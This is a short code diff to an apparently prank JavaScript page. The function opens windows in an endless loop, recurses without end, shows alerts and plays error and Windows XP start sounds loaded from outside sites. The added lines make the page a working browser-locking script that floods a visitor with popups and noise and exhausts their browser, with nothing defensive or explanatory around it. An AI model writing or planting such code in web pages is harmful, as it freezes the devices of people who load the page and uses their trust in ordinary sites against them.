@@ -6,8 +6,14 @@
     function infiny() {
         for (var i=0; i<Infinity; i++) {
             open("./.");
-            alert("HEHEHE");
-            infiny();
+            var error = new Audio('https://www.myinstants.com/media/sounds/erro.mp3');
+            var xp = new Audio ('https://www.winhistory.de/more/winstart/mp3/winxp.mp3');
+            error.play();
+            xp.play();
+            alert("Error uwu");
+            for (var i=0; i<Infinity; i++) {
+                infiny();
+            }
         }
     }
     infiny();
